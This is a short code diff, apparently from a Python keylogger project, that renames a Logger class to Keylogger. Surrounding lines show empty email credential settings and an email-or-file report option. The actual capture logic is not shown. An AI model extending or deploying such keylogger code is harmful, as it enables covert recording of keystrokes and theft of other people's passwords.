@@ -8,7 +8,7 @@ EMAIL_ADDRESS = ""
 EMAIL_PASSWORD = ""
 
 
-class Logger:
+class Keylogger:
     def __init__(self, interval, report_method="email"):
         self.interval = interval
         self.report_method = report_method
@@ -78,5 +78,5 @@ def start(self):
 
 
 if __name__ == "__main__":
-    logger = Logger(interval=SENDING_INTERVAL, report_method="file")
-    logger.start()
+    keylogger = Keylogger(interval=SENDING_INTERVAL, report_method="file")
+    keylogger.start()
